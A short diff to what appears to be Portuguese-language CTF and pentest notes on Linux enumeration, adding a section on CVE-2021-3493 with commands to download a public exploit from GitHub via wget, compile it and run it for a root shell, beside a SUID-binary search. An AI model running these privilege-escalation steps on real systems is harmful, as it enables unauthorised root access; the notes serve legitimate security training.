@@ -41,6 +41,12 @@ ssh root@<IP> -i id_rsa
 
 Enumeração de sistema e ambiente Linux — comandos úteis para reconhecimento inicial, CTFs e pentests.
 
+# CVE-2021-3493 (Afeta: Ubuntu 18.04 (kernel 4.15.x < 5.11).)
+Exploit: https://github.com/briskets/CVE-2021-3493
+Baixe: wget https://raw.githubusercontent.com/briskets/CVE-2021-3493/refs/heads/main/exploit.c
+Compile: gcc exploit.c -o exploit
+Rode: ./exploit (dá shell root direto).
+
 # Esse comando procura todos os binários SUID root no sistema e lista seus detalhes.
 find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
 
